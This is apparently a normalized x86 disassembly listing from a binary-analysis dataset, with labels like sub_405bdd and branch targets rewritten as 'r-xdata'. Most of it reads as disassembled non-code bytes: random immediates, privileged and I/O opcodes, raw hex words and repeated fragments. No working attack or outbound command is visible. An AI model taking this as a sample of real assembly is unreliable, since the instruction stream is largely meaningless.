test [ edx + esi * 8 + 0x666a0506 ] ch
je r-xdata
sbb eax [ 0xfffffffff648b565 ]
xchg ebp eax
iretd
dec eax
lodsb [ esi ]
ja r-xdata
push es
add eax 0xfa74666a
aas
adc al 0x74
cli
aas
sbb [ ebx - 0x2b ] cl
insd
xor [ ebx ] ah
cli
jmp [ ebx + 0xd96a05 ]
add eax 0x6f233071
push 0x5a
lodsb [ esi ]
inc bx
lodsb [ esi ]
outsb
inc ebx
xor [ eax ] 0xb16670a8
in eax 0xf9
js r-xdata
loop r-xdata
and ebp [ edi + 0x6a ]
pop edx
and edx [ ebx - 0x6b ]
inc ebp
aaa
outsd
push 0x5a
and edi edx
aas
pushad

and ebp [ edi + 0x69 ]
pop edx
and ebp [ edi + 0x6b ]
pop eax
and eax [ 0xfffffffffa72b06a ]
aas
adc [ edx + 0x2f45e1c2 ] ch
test [ eax + esi + 0x666a053f ] ch
je r-xdata
pop edx
jno r-xdata
mov [ 0x2315d0c3 ] al
add eax 0x50dc673c
inc esi
fcom [ bx + si + 0x42 ]
mov ebx 0xf26f0966
bound eax [ 0x397bbb6a ]
imul ebp eax 0xffffffa8
jge r-xdata
and ebp [ edi + 0x6a ]
sub_405bdd
pushad
push ds
jno r-xdata
inc edx
imul ebp [ ebx ] 0x96a4f5c
jne r-xdata
sbb al [ fs : esi + eax * 2 + 0x77 ]
sbb [ ecx + 0x4d ] edi
arpl [ 0xffffffff82c2cb30 ] ax
iretd
pushad
imul eax [ 0xb4d4643 ] 0xf69475e
xor bl cl
xor al [ eax + 0xf42dccf ]
inc esp
outsd
push 0x4
push edi
jae r-xdata
add eax 0xfac9bc82
cmp eax 0x2c714a51
pop edi
push ecx
inc ecx
rsqrtps xmm2 [ esi + 0x62 ]
das
inc esi
inc esi
imul ebx [ esi ] 0x30

push ds
pop eax
insd
pop es
push ebp
bound eax [ 0xfffffffffacca782 ]
xchg ebp eax
ja r-xdata
in eax dx
jpe r-xdata
inc ebp
inc edx
imul edi [ edx ] 0xf714c42
push ebx
push edi
inc eax
adc dh [ eax ]

inc esp
inc esi
push ebp
sbb [ edi + 0x40 ] bl
pushad
sbb [ ebx + 0x23 ] eax
in eax dx
movsb [ edi ] [ esi ]
rcr esp 0xfa
jno r-xdata
xchg ebp eax
dec dx
ja r-xdata
fdiv st2
cmp eax 0xf714a42
jbe r-xdata
pop ebx
insb
push ds
jae r-xdata
pop edi
dec esi
push 0x49475e0b
add ebx [ esi + 0x46 ]
push edx
push 0xffffffd8
lahf
0x7760cf95 0x510f
cmpsd [ esi ] [ edi ]
int3
imul ecx [ edi ] 0x8026cb30
iretd
imul ebx [ esi ] 0x30

popad
punpcklbw mm2 [ ecx + 0x6a ]
or [ ebp + 0x50 ] edx
jbe r-xdata
pop ds
inc esp
inc esi
inc esp
push 0xffffffd8
mov ch 0xed
xchg ebp eax
iretd
fcom st2
in al dx
xchg ebp eax
iretd
sub_405cf7
sbb [ ebp + 0x4a ] bl
imul ecx [ ebx ] 0x44
inc esi
push ebp
sbb [ edi + 0x40 ] bl
pushad
sbb [ ebx + 0x23 ] eax
in eax dx
movsb [ edi ] [ esi ]
rcr esp 0xfa
cmp eax 0x2c714a51
pop edi
push ecx
inc ecx
rsqrtps xmm2 [ esi + 0x62 ]
das
inc esi
inc esi
imul ebx [ esi ] 0x30

sub_405d21
fadd [ esi + 0x5 ]
pop esi
push edi
insb
add al 0x45
inc esi
inc ecx
rsqrtps xmm2 [ esi + 0x62 ]
das
inc esi
inc esi
imul ebx [ esi ] 0x30

sub_405d36
lea ecx [ ebp + 0x656dccf ]
push ebp
inc esi
jne r-xdata
jge r-xdata
fsub [ ecx ]
out dx eax
xchg ebp eax
iretd
dec ebx
push ds
pushad
push ecx
push 0x1e
dec ebx
ja r-xdata
iretd
pop ecx
push ecx
jno r-xdata
pcmpeqd mmx1 [ edx + 0x69 ]
wrmsr

push ecx
inc edi
add eax 0xfacc3082
xchg ebp eax
jle r-xdata
push cs
push ecx
dec edi
dec eax
minps xmm1 [ edi + esi * 2 + 0x13 ]
xor bl cl
sub al 0x9a
iretd
fmul [ ebx + 0x1e ]
dec ebp
push 0x6c75400b
cmova ebp [ ebx + 0x39 ]
push ebp
inc eax
jno r-xdata
inc esi
sbb [ ebp + 0x42 ] dl
jno r-xdata
push 0x55a4205
and [ eax ] 0xd3
cli
xchg ebp eax
jle r-xdata
iretd
cmp [ esi ] 0xd3
cli
xchg ebp eax
je r-xdata
pop edi
dec ebp
add eax 0xfad33e82
push ebp
inc eax
jno r-xdata
push ds
jbe r-xdata

inc edx
cmove esp [ eax + 0x6a ]
add al 0x44
inc esi
xor bl cl
call 0x51d2dfe
mov edx 0x31ed2332
fstpnce st4
cli
push 0x30
and eax [ 0xfffffffffaca5a82 ]
xchg ebp eax
xor [ ebx ] ah
add eax 0xfdddd86a
xchg ebp eax
iretd
pop ds
push edi
bound esp [ esi + 0x1e ]
pop ecx
push ebp
pushad
cmp al [ edx + 0x4c ]
cmovae dx [ eax + 0x5 ]
and [ edi ] 0xca
cli
xchg ebp eax
push eax
pushad
sbb [ ebx ] al
adc [ 0xfffffffffaca2182 ] eax
xchg ebp eax
jne r-xdata
xor bl cl
aam 0x84
imul ecx [ edi ] 0x827dcb30
iretd
dec esp
jpo r-xdata
jo r-xdata
ja r-xdata
sbb [ esi ] 0xca
cli
xchg ebp eax
push 0xffffffd8
lodsb [ esi ]
jecxz r-xdata
dec edx
imul ecx [ esi ] 0x5f
push esp
jbe r-xdata
xor esp [ edx ]
push cs
lodsd [ esi ]
cdq
out dx eax
inc esp
push ecx
das
pop fs
mov eax 0x30d0792d
xchg dh bh
fdiv st2
push 0xa
push 0xca351dd4
cmp esp [ edi - 0xb071b5c ]
xor bl cl
jl r-xdata
inc esi
push cs
iretd
and eax 0xf5e3a1e0
mov esp 0x1e149657
jecxz r-xdata
fsubr [ ebx + 0x606bcf95 ]
or eax [ eax + 0x62 ]
imul eax [ esi ] 0x8205405f
ror edx 0xfa
xchg ebp eax
push esp
push ds
push ds
xchg [ ebp + 0x7b ] dh
insd
inc eax
xor al 0x24
rcl [ eax ] 0x1
rcr ebx 0xc4
sub_405d45
push eax
insd
subps xmm1 [ edi + 0x36 ]
pop eax
xor bl cl
inc [ ebx + 0x256dccf ]
push ebp
dec edi
imul ebp [ edi ] 0x1f664648
inc esp
inc esi
inc esp
push 0xffffffd8
mov ch 0xed
xchg ebp eax
iretd
sub_405fad
and eax [ 0x4ccb306a ]
or bh 0xdc
add eax 0xed23306a
imul eax ebx 0xffffffdc
cli
push ebx
dec esp
jne r-xdata
cmovs eax [ esi + 0x5 ]
sub [ edi + 0x3195fad1 ] 0x23
add eax 0xed9cd86a
xchg ebp eax
iretd
push ebp
inc edi
sub ecx [ edi ]
dec eax
inc esi
add eax 0xfad1af82
xchg ebp eax
xor [ ebx ] esp
sub_407fb0
and [ ebp + 0x2d ] cl
mov bh 0x81
sti
xor eax 0xd8dd0374
and cl [ edx - 0x34123477 ]
xor al 0xea
sub [ edx - 0x71 ] bh
mov esp es
pushfd
push cs
insb
mov dl 0x66
retn 0x14b
sub_408413
cld
cmpsb [ esi ] [ edi ]
scasb [ edi ]
mov ebx 0x62c4785d
xor al ch
cmp esp [ ecx + ecx * 8 + 0x76 ]
mov [ esi ] ah
sub al 0x8b
xor al 0x35
or cl ch
movd mm2 esp
xchg edx eax
fadd [ ss : edx - 0x3b ]
cli
sub al 0x8b
xor edx ebp
mov cl 0x31
fist [ esi + edi * 2 ]
jbe r-xdata
mov al 0x94
mov dh 0x40
cmpsb [ esi ] [ edi ]
out dx al
cmovb eax [ esi + eax * 4 ]
mov edi 0x83e23293
nop
insb
fistp [ edi - 0x6dd0beaa ]
stosd [ edi ]
mov ebp 0xfbdb5880
push ss
mov esi 0x78583f37
jg r-xdata
dec dx
and [ ecx + 0x368a6708 ] dh
xor eax 0xf7c795ad
scasd [ edi ]
fiadd [ 0xffffffffa657ae7a ]
or [ edx - 0x7b ] ch
sub eax 0x1500089e
arpl sp cx
adc eax 0x800319e5
lea edi [ eax ]
dec ebp
jle r-xdata
xor al 0x8
xor ah dl
adc [ eax + 0x56bfdf6c ] 0x41
das
xchg edx eax
mov dh 0x1c
fdivr [ eax ]
aaa
sbb eax 0xfeb1733e
sub_408446
aas
pop eax
js r-xdata
xchg esi eax
or [ edx - 0x7b ] ch
sub eax 0x1500089e
arpl sp cx
adc eax 0x800319e5
lea edi [ eax ]
dec ebp
jle r-xdata
xor ah dl
adc [ eax + 0x56bfdf6c ] 0x41
das
xchg edx eax
xor al 0x8
mov dh 0x1c
fdivr [ eax ]
aaa
sbb eax 0xfeb1733e
sub_40b25e
xor [ ebx + 0x43 ] eax
mov al [ 0x3f3902 ]
mov ch 0x8c
xchg esi eax
or [ ebx + 0x6d ] bh
push ds
push esi
jbe r-xdata
aas
and al 0x6e
cmp eax 0xc4f1bacc
sbb ecx [ edi + 0x61 ]
adc [ ecx + 0x7 ] edx
mov al 0xb4
dec ebp
pop ecx
pop edx
daa
out dx eax
loop r-xdata
jbe r-xdata
cwde
or al 0xac
adc edi edx
cmc
lds esi [ ebp - 0x3a ]
pop edx
xchg ebp eax
jge r-xdata
pop ds
in eax 0x55
int1
dec edi
dec edx
xchg esp eax
adc eax 0x286b9309
lahf
daa
0x3ac933f8 0x4132
fcom [ ebx + 0xd ]
mov ebp 0x74a421a8
pushfd
or eax 0x30d78aa
adc al 0x4
loopne r-xdata
fsub [ esi + 0x3fc44043 ]
inc ebp
sar [ edx + 0x110603cf ] 0xf6
mov [ ecx + ebp * 4 ] al
add eax 0x1653beac
xchg ebx eax
fst st6
leave
les esi [ ecx + 0x4d ]
sar [ 0x11bd59e ] cl
inc ecx
push ecx
cdq
nop
dec ecx
scasb [ edi ]
dec ebp
push ecx
fdivr [ eax + 0x279c6460 ]
cmpsd [ esi ] [ edi ]
in eax 0xfa
cli
movsb [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov bh 0x6f
out 0x9c eax
pop ss
fisubr [ edx + 0x3e ]
inc ebp
mov [ 0xffffffff910f33dd ] eax
cmp esi esi
pushad
xchg esi eax
mov ecx cs
daa
mov fs [ ecx - 0x191ee438 ]
add esp [ ecx + 0x751112e ]
sub_40cfe8
pop ds
and eax 0x5453026c
fmul st6
dec esp
mov [ eax - 0x5b ] ss
jns r-xdata
pop ss
dec eax
jl r-xdata
fcomp [ ebp + 0x61 ]
dec edx
mov ecx 0x7bb86260
insb
jg r-xdata
ja r-xdata
das
out 0x52 eax
jb r-xdata
mov esp 0x56e5d819
cmpsb [ esi ] [ edi ]
mov ecx 0x916e1b5c
push edx
idiv [ esi + ebx ]
mov edi 0xda9f7a35
xor [ eax + 0x1380f872 ] al
sbb [ edx + ebp * 8 - 0x7ac9b42 ] ah
shl [ edi + 0x72 ] 0xcc
mov ss [ edx + 0x19 ]
cmp ecx ecx
int1
xchg edx eax
xchg esp eax
test [ ecx + 0x54 ] dl
lds edi [ eax + 0x54 ]
sbb ecx [ esp + ebp * 8 + 0x5c ]
adc al 0x5d
push 0x37
xor dh bl
mov esi 0xbb7574fc
mov esp 0x83ba0550
or eax 0x6fb2964a
push ebp
outsd
mov [ 0x4ef55c2e ] al
jno r-xdata
jecxz r-xdata
shl [ ecx + edi * 4 - 0x15e2f9d4 ] 0x1d
inc esi
popad
shl al 0xc4
mov edx 0xb18d51b1
sbb eax [ esi ]
cmp bh ah
push ds
mov esi 0x701cbb40
pop ebp
push 0x45
dec edi
or al 0xb5
test [ ecx + 0x4f ] al
push edi
push cs
out dx eax
dec ecx
out dx eax
test al 0xac
jo r-xdata
call 0xffffffffdd597c00
sub eax 0x258e755f
mov esi ecx
aad 0xd2
movsb [ edi ] [ esi ]
lodsb [ si ]
aaa
call sub_40cfe8
scasb [ edi ]
xchg [ 0x1030e589 ] bh
int3
ficomp [ ebx - 0x626b9ef7 ]
dec edx
jns r-xdata
mov esi 0x9562e658
mov ss [ ecx + esi * 4 - 0x72 ]
adc al 0x29
sbb edi [ gs : 0x1b053014 ]
dec ecx
push es
test [ esi ] ecx
mov ecx 0x5824ea19
inc esp
dec ecx
0xd1fe
rcr bh 0x1
jo r-xdata
aad 0x53
jb r-xdata
popfd
adc al 0xcd
mov al [ 0x24912797 ]
push ds
mov al [ 0x660ce4d1 ]
outsb
insd
jbe r-xdata
call 0x7158bf33
pop ebp
jpe r-xdata
fdiv st0
and [ ebp + edx * 8 + 0x52 ] 0xf5
lea ebx [ edi + 0x146cd5d0 ]
outsb
mov ch 0xed
test [ ebx + edi * 4 - 0x491c251 ] al
dec ebx
or bl [ ebx + 0x7b ]
mov fs sp
xchg [ ebx + 0x6e ] eax
int 0x93
lodsd [ esi ]
inc esi
mov bl 0xa0
jbe r-xdata
pushfd
xchg esi eax
stc
test al 0x6e
mov ch 0x3c
jns r-xdata
aas
adc eax 0xdc7c4817
mov ch 0x84
inc ecx
dec edi
les eax [ eax + edx ]
lds eax [ ebx - 0x1e ]
xlat
0x951f9c15 0x645a
push eax
mov ebx 0xea817a82
lahf
loop r-xdata
0x118d90e7 0xff09
fstp [ eax - 0x29 ]
in eax 0x2b
nop [ ecx ] ebx
scasb [ edi ]
jge r-xdata
or al 0x5
push ebx
rcr [ ebp + 0x62de2505 ] 0x49
jo r-xdata
xchg ebp eax
mov dl 0x77
test al 0xa0
leave
cwde
add al 0xe
adc eax 0xdc7c4817
ror [ edi + ebp * 4 - 0x465b3f3b ] 0x2c
push es
sbb eax 0x61461dea
int 0x4c
arpl [ edx - 0x32 ] cx
and al 0x36
sbb [ eax - 0x41 ] esi
xor al 0x35
or [ ecx - 0xf ] dh
sbb eax [ edi - 0x2c ]
stc
mov bh ah
cmp bl [ eax + 0x5303c2cd ]
lahf
0x38a3
sub_40d4dd
pop esp
pop ebp
out dx eax
mov dl 0xd4
and ecx ecx
stosd [ edi ]
js r-xdata
or esp 0xc91f7f65
xlat
imul ecx eax 0xcc660f35
out dx eax
insb
aad 0x37
enter 0x6b4c 0x71
pop ebp
jae r-xdata
sbb eax 0x140c210f
arpl dx sp
push 0x236e4f90
pop edx
push ds
inc esi
shufps xmm2 [ edx + 0x36fc3f18 ] 0xdf
hlt
mov cl 0x94
adc ch [ edi - 0x42 ]
fisub [ fs : ebx ]
cmp esi [ esp + ebx * 4 + 0x53a0bec1 ]
push ebp
inc esi
or eax 0x628b1a0c
cmpsd [ esi ] [ edi ]
test al 0xd3
bound ecx [ esi + 0x683c5189 ]
insd
push 0x47bfd88a
sub_40e1fd
and dh [ eax - 0x51c5338c ]
clc
sbb al 0x9d
push eax
inc ebx
sbb [ edi + 0x67 ] dh
out dx al
std
mov ebx 0xd94b8790
adc [ esi - 0x29 ] dh
std
imul eax [ eax ] 0x22
hlt
sub_411c0d
push esp
mov dh 0xf
push eax
rol [ eax - 0x66f3a99 ] cl
mov dh 0x6
popfd
in eax dx
adc al 0x12
stc
or edx [ ecx ]
pushfd
inc ebx
xor [ ebx ] bh
sub [ edi ] bl
xchg edi eax
hlt
sub_411c5b
xchg esp eax
cmp [ edx - 0x5f ] bl
cmp esi ebx
out 0x37 al
pushfd
fstp [ esi - 0x7 ]
push [ esi - 0xc ]
and eax 0x818c7244
movsd [ edi ] [ esi ]
dec edi
push ss
in al 0xd6
lds edi [ eax + 0x1484b61e ]
mov esi 0x2c0e065c
aad 0x34
inc ecx
not eax
into
jpe r-xdata
dec esp
push esi
mov esp 0x8b465d69
inc ebp
lds ecx [ ecx ]
fldenv [ eax + 0x471315d1 ]
sub al 0x4a
clc
leave
pop ds
jle r-xdata
fdivr st5
loopne r-xdata
cmpsb [ esi ] [ edi ]
cwde
popfd
out 0x4b al
iretd
and al 0xdc
0x68c2d635 0xaa85
mov bl 0x9
inc eax
sub_412f34
test eax 0x9b98d403
into
push ss
mov eax 0x7a8b3c93
mov edi 0x99403d58
push es
imul ebx [ esi ] 0x4
inc ecx
push es
loop r-xdata
movsd [ edi ] [ esi ]
dec eax
cmp [ esi - 0x7575e45b ] bh
xor dh [ esi + ebx ]
jbe r-xdata
mov bl 0x11
shl [ ecx + 0x23798cdb ] cl
mov ds [ edx + ebx + 0x3e ]
or ch [ ebx + 0x48a54b40 ]
push cs
pop ebp
adc [ esi - 0x6f3b90bb ] esi
adc [ esi + 0x46ceb897 ] al
cdq
mov eax [ 0x9e3bc ]
xchg esp eax
aad 0x78
inc dh
sub_4136ff
and [ edx + ecx + 0x14129488 ] ecx
cmp bh [ ecx - 0x52 ]
leave
push ds
cmp [ ecx ] al
pop edi
adc cl [ esi ]
cmp [ edi ] cl
pop es
aaa
out dx eax
push ds
mov edi 0x18c9ed8a
leave
[ eax - 0x9edc610 ]
sub_41999e
push esi
movsb [ edi ] [ esi ]
lds esi [ ebx ]
scasb [ edi ]
cmp [ eax + edx * 4 + 0x68 ] cl
push 0x23e05dff
push ds
aaa
adc eax 0xd305fcf9
sbb [ edx + 0x6e ] 0xb7
push ss
outsb

sub_419df6
rcr [ eax ] 0x7
sub eax 0x44539100
push ss
adc ch [ eax - 0x10b8b0a2 ]
push 0x35263540
jpo r-xdata
clc
dec esi
add eax 0x44555924
cmp ecx esi
salc
fisub [ edx - 0x7b ]
and al 0x83
dec ebx
daa
pushfd
dec edx
inc ebp
mov eax [ 0x416f8516 ]
0x20f84ad6 0x59e5
mov [ ebp + 0x7b ] cs
push ebx
push edx
add eax 0x17a0aa6a
adc al 0x5c
in eax 0x66
adc esi [ edx - 0x3c6ff45e ]
push ss
mov esp esp
mov [ ecx ] ebp
mov dl bl
stosd [ edi ]
lea ebx [ edx - 0x5 ]
cli
ror [ edx - 0x43 ] cl
xor [ eax + edi * 8 + 0x4e ] edx
sub_41b877
lds ebx [ eax + edx - 0x6f478449 ]
div [ esi - 0x72 ]
inc ecx
cmp ebp [ ebp + 0x78db9c26 ]
adc eax 0xb694c219
adc [ ebx - 0x296e695e ] 0xffffffef
test al 0x9b
push edi
sbb [ esi + 0x51253044 ] edx
push ebx
push edi
xlat
sub dh [ edx + ebx * 4 - 0x5e74aaf4 ]
mov dh 0x23
push edx
cmp eax 0x4f5bc2b2
dec edx
inc ecx
pop ecx
or [ edx ] cl
dec edx
std
inc ebp
mov bh [ edi + 0x39 ]
adc ah bl
test [ edi - 0x31 ] eax
dec esi
xchg ebx eax
stosd [ edi ]
in eax dx
les edx [ ebx - 0xf852ba7 ]
or al 0x7e
out dx eax
fisubr [ edi + 0x15 ]
jl r-xdata

jge r-xdata
sar edi cl
ja r-xdata
rcr dl 0x2e
xor [ esi - 0x2f ] 0xae4414fa
sbb eax 0xa2ffe7ae
insd
or al ch
out dx eax
ficom [ esi - 0x3fe05689 ]
fsubr [ edi - 0x71 ]
sbb ecx esi
leave
pop eax
daa
cmp eax 0x4f2f8231
0x69f7c3ac 0x7244
xchg edx eax
ror [ edi + 0x19 ] 0x1
push esi
leave
xchg ebx eax
mov [ 0xffffffffa23e9026 ] eax
jae r-xdata
xor dh [ ebx - 0x5744b3e7 ]
out dx al
stosb [ edi ]
add dl [ edx + 0x685021c5 ]
push ecx
cdq
mov bl 0x6a
adc [ edi - 0x1 ] 0xff
dec esi
dec ecx
test eax 0xe5641e54
cmp [ ebx - 0x6c3b1255 ] edx
pop ecx
aam 0x7a
sub_41bd21
xchg ecx eax
and al 0x8f
push 0x55
insb
bound esp [ edi + 0x5f ]
or [ esi - 0x35498d28 ] 0x43
xchg esi ecx
push ds
fidiv [ ebx + 0x5 ]
fisub [ edi ]
int1
outsd
rcr ebx cl
0x76f96c8c 0xc7c7
sub_41bd64
mov edi 0x318aa42c
inc ecx
xchg esp eax
insd
fimul [ ebx - 0x29 ]
mov eax [ 0xffffffffabb262d5 ]
out 0x91 eax
jecxz r-xdata
sbb ah [ ebp + 0x79736820 ]
and al 0xe8
fnstsw [ esi ]
push esi
int3
sub_41ca95
xchg esp eax
and al 0x47
xchg esi eax
or esi 0x151a7d0c
cmc
push ecx
and ebp [ ecx ]
mov [ 0x7272f184 ] edi
mov bh 0x5
cdq
out 0x4c eax
push esp
push edi
jmp r-xdata
mov ebx 0xd5260286
sbb [ ebp - 0x67965ee1 ] 0xfffffff1
in al dx
push ebx
or eax 0x7fb40612
lds eax [ eax ]
push ebx
cmp eax 0x2f6dff2b
xor [ ebx + 0x4bd52634 ] al
outsd
mov [ ebx + 0x5700a6c3 ] cl
sub_41d4a1
inc edx
mov al 0x1c
inc ebp
and al 0xd6
sbb eax 0xda387f2b
xchg edi eax
in eax 0x28
cmovge esi [ ebx + 0xc ]
mov bl 0x80
cmp ebp [ edi - 0x3b ]
add [ eax + eax * 8 + 0x7a ] 0x70
pop esp
bound ecx [ edi - 0x656f6f2c ]
mov cl 0x56
pop esp
iretd
sub_41d4cb
xchg esp eax
pop ebx
lodsb [ esi ]
xchg ecx eax
xlat
cmp ch ch
daa
dec edx
in al dx
mov eax 0xb8587fbd
inc ebx
jpo r-xdata
mov al 0xff
dec edx
cli
push ebx
xchg edx eax
mov edx 0xaeab5c6a
push ss

pushfd
mov ch 0x31
imul edi [ 0x9c26da3 ] 0xe0554824
xor [ ecx ] dl
mov al [ 0x4affb0b5 ]
sub_41dcc4
xchg esp eax
mov ebx 0x5b17d270
aaa
dec ecx
cmpsd [ esi ] [ edi ]
cmpsd [ esi ] [ edi ]
and edx [ edx + 0x17fc37b1 ]
stosd [ edi ]
and [ esi + 0x39a096f7 ] 0xffffffec
push ss
stosb [ edi ]
sbb ecx [ edi ]
0xa345e20f 0xd69f
sub_41fbcf
cdq
test eax 0xe7f2e0de
in al 0x52
xchg ebx eax
push ss
xchg ebp eax
nop
or [ esp + eax * 2 + 0x6a9b621f ] ch
inc ebx
jge r-xdata
loopne r-xdata
std
int1
out 0x91 al
popad
cli
aad 0xdd
jo r-xdata
loopne r-xdata
pushfd
into
xchg ebp eax
add [ edi ] edx
0xbc2ef6f3 0xbc06
push ebp
sub_41fff6
push esp
pop edi
fcomp [ edi - 0x207d1890 ]
pop edi
adc [ ebx - 0x58 ] 0xf24b8a59
jecxz r-xdata
mov bl 0x44
mov [ 0xffffffffa259e931 ] eax
sbb [ edx - 0xe3231f8 ] edx
cmpsb [ esi ] [ edi ]
inc edi
or al [ edx - 0x2e ]
aaa
out dx al
pop esi
out 0x3f al
push 0x79766174
mov eax [ 0x1d072913 ]
sti
mov esp [ edx + 0x59 ]
add dl 0x7c
dec esp
or al 0x47
outsd
xor dh [ ebp + 0x71 ]
mov ebp 0xd2ca4bdb
cwde
mov ebx 0x596a26f2
xor [ edi ] esp
0xac4a
dec edx
leave
inc ecx
xchg [ ebp - 0xa ] edi
scasd [ edi ]
mov edx 0x6c0e54a3
jmp r-xdata
sub_425976
outsb
push ebx
or al bl
adc eax 0x2d7d9da0
sahf
cmc
sbb al 0x18
outsd
fisttp [ ecx - 0x66 ]
dec ecx
mov cl [ eax - 0x5ec19d38 ]
cmp eax 0x6a178479
movsd [ edi ] fs : [ esi ]
push es
sbb [ eax ] ch
or eax 0x5a8e2043
jae r-xdata
inc dl
in eax dx
jb r-xdata
movsd [ edi ] [ esi ]
cmc
mov eax [ edx ]
cmc
push eax
vaddps xmm4 xmm7 xmm0
popad
jmp r-xdata
sub eax 0x163f4687
lea edx [ eax + 0x37 ]
shl [ eax + 0x5271e346 ] cl
fmul [ edi ]
cdq
dec esi
dec esp
aad 0x51
mov ch 0x5e
int1
inc ebx
jmp 0xffffffff863a65c5
sub_426cb7
push [ esi + 0x7b ]
into
bound ebp [ ebp - 0x76235cc3 ]
adc [ esi + 0xb3936a ] 0xffffff8a
int1
pop edx
inc eax
sbb esp [ ebx + 0x7f4edbb4 ]
fwait
lds esi [ esi + ebp * 4 - 0x5fe176fe ]
lea esp [ esi ]
xchg [ edx + 0x64 ] ecx
retn
sub_42ae8d
xchg [ esi ] bl
ja r-xdata
dec edi
jle r-xdata
out 0x32 al
mov dh 0xa6
push 0x9ea224f7
fiadd [ ebp + 0x4194b894 ]
aad 0x46
fimul [ edi + 0x1d ]
rcl [ ecx + 0x24abf202 ] 0x15
sub dl ah
mov dh 0xe2
mov al [ 0x3d297b8f ]
cmp al 0xe5
pop es
push ebx
shl [ edi + 0x5c464424 ] 0x1f
jmp r-xdata
shl [ edx + edi ] 0x1
out dx al
in eax 0x97
mov [ 0x671cdf17 ] eax
enter 0xa7c0 0x24
inc esp
inc esi
pop esp
pop ds
push esp
adc eax 0x6f09697
or [ esi + 0x41 ] 0x63
add ebx ecx
loopne r-xdata
pop ds
popfd
jbe r-xdata
jpo r-xdata
pop ebp
jpe r-xdata
dec esi
mov ch 0x4f
imul [ ebx + 0x1b ]
pop esi
xchg edi eax
jmp 0x2b606dd8
cmp eax 0x5307e53c
sub_42fa91
mov esi [ edi + 0x40 ]
shr [ eax + 0x43e67729 ] 0x1
rcr [ edi ] 0x1
adc esi 0x85f8308e
pop esi
0xe15ea80 0x2aea
push cs
loope r-xdata
pushfd
clc
pop esp
sub [ ebx ] ah
lea esp [ edx + 0x7b979ae3 ]
loope r-xdata
pop esi
das
loop r-xdata
sti
push ecx
imul ebx [ eax ] 0xc3393957
fdiv [ edi - 0x6b ]
mov dl [ ebp + 0x700cd8fc ]
dec esi
mov ebp 0x56428d5b
cmc
cwde
jo r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jns r-xdata
mov edx 0x436a6810
dec edi
mov [ edi - 0x27d5dc2 ] esi
mov al [ 0xffffffffffb850f0 ]
inc esp
push esi
jns r-xdata
inc eax
xchg edi eax
jpo r-xdata
loope r-xdata
sub_42fbbd
mov al [ eax ]
stc
fisttp [ edi + edx * 4 + 0x51e56a3e ]
cmp ebx esi
leave
inc ecx
xor bh cl
jpo r-xdata
mov bh 0x68
sub ebp esp
xor esp 0x8d272790
in al 0xc
jmp 0x4c6022ab
sub_42ff35
pop esp
dec ebx
sbb [ eax + 0x753eb5f7 ] ebp
or [ ebp + 0x53ff671f ] ecx
push edx
or al 0x11
pop eax
push ecx
fisub [ esi ]
push ds
out 0xb2 al
xchg esp eax
retn 0xf27c
sub_42ff51
in eax dx
xlat
cmpsd [ esi ] [ edi ]
fild [ ebx - 0x5d ]
imul eax edi 0xffffff80
cmp eax 0x65c5c648
nop ebp ecx
mov ebx 0x2411e6f0
jpo r-xdata
test al 0xbf
0x78fc0525 0xae6f
cld
rcl [ esp + ebp * 4 ] 0x83
test eax 0xa3b3511c
or [ ebp + 0x53ff671f ] ecx
push edx
or al 0x11
pop eax
push ecx
fisub [ esi ]
push ds
out 0xb2 al
xchg esp eax
retn 0xf27c
jmp r-xdata
cmp eax 0xcc89fb6d
jpe r-xdata
mov bl 0xa3
sub_430028
out 0x9a eax
leave
jg r-xdata
xchg ebp eax
idiv bh
std
mov dh 0x81
mov esi 0xb1426c12
cmp [ ebx + 0x5db87f45 ] 0xa4d2a50f
xchg ecx eax
test [ ebx - 0x7e5f82e3 ] esp
xchg esp eax
popad
retn
sub_430c9b
adc ah [ ebp + ebx * 4 - 0x31 ]
jg r-xdata
out 0xbc al
loopne r-xdata
mov [ 0xffffffffd897ec98 ] eax
or ebp [ ebp - 0x5525fb0 ]
sbb esp [ ecx ]
fwait
mov ebx 0x75f7ee20
push cs
xor [ ebx - 0x38 ] esi
0xd5a11ffb 0xf8ee
inc eax
lea esp [ edi ]
sub [ eax ] esi
inc edx
jmp [ edx + 0x46 ]
xor [ edi ] dh
scasd [ edi ]
add [ ebp + 0x2621c8ed ] cl
lodsb [ esi ]
sub [ edi - 0x1305933c ] cl
jo r-xdata
outsb
add ch [ esi ]
add al 0xb
stosb [ edi ]
nop
test al 0x34
mov ah 0xc6
xchg edi eax
fdivr [ edi - 0x50c8cffc ]
mov ch 0xd2
call 0xffffffff81030530
jg r-xdata
in al dx
xchg edi eax
fmul [ ebx ]
lodsd [ esi ]
push eax
mov al [ 0x211bfaad ]
push ds
xchg esp eax
out 0x5f al
iretd
sub_431eb4
sar [ edx + 0x15 ] 0xd7
jpe r-xdata
xchg esi eax
cmp bh 0x29
jno r-xdata
mov ch 0x6f
std
jae r-xdata
and ch [ ebx ]
push ds
jg r-xdata
or [ esi ] edi
cmp edx ebp
inc ecx
xchg ebp eax
xchg edx eax
test [ edi ] ebx
jns r-xdata
mov ebp edi
xor [ edx - 0x5a23b78c ] bh
stc
and al [ esp + edx * 4 - 0x5e300337 ]
0xd525
lea edi [ edi - 0x10747b5c ]
nop
leave
inc ebx
mov [ ebx + 0x22486468 ] fs
sub al 0xd8
jle r-xdata
add eax 0x5ea83603
pop ebx
sub dl [ eax - 0x5c73bc37 ]
push 0x2c224864
fdivr [ esi + 0x7d ]

sub_432bae
xor bh ah
push cs
and al [ ebx + ecx * 8 ]
aas
inc edx
rol [ ecx + 0x928c74d ] 0x1
push 0xfffffffb
mov eax 0x525ee266
sub ebp esi
out 0xa9 al
test al 0xc1
mov ch [ ebp - 0x7e ]
clc
or al 0x37
push ebp
out dx al
mov ch 0x4e
and [ ebx + 0x21 ] al
pop edx
vpand xmm0 xmm6 [ edx + edi * 2 - 0x7a ]
add eax 0xf14339f1
push ss
rcl [ edx - 0x55 ] 0xff
or cl [ eax + ecx * 4 + 0x3f ]
dec esi
mov ebp 0xfd4f8fd2
int 0x84
jpo r-xdata
adc esp edx
xchg edx eax
add [ esi + ebp * 4 + 0x7e ] dl
dec esp
fstp [ edi - 0x33 ]
loopne r-xdata
pop ebp
loope r-xdata
xchg [ ecx + eax * 4 - 0x7b5080d6 ] ah
mov bl 0x56
aad 0xd4
0xbfb91ad8 0xf1f9
inc edi
test al 0x78
cmp al 0xf0
push ecx
adc cl bl
xchg ebx eax
jns r-xdata
std
adc eax 0x1394ae45
and dh [ ebx ]
push esp
salc
adc eax 0x18ee0505
out dx al
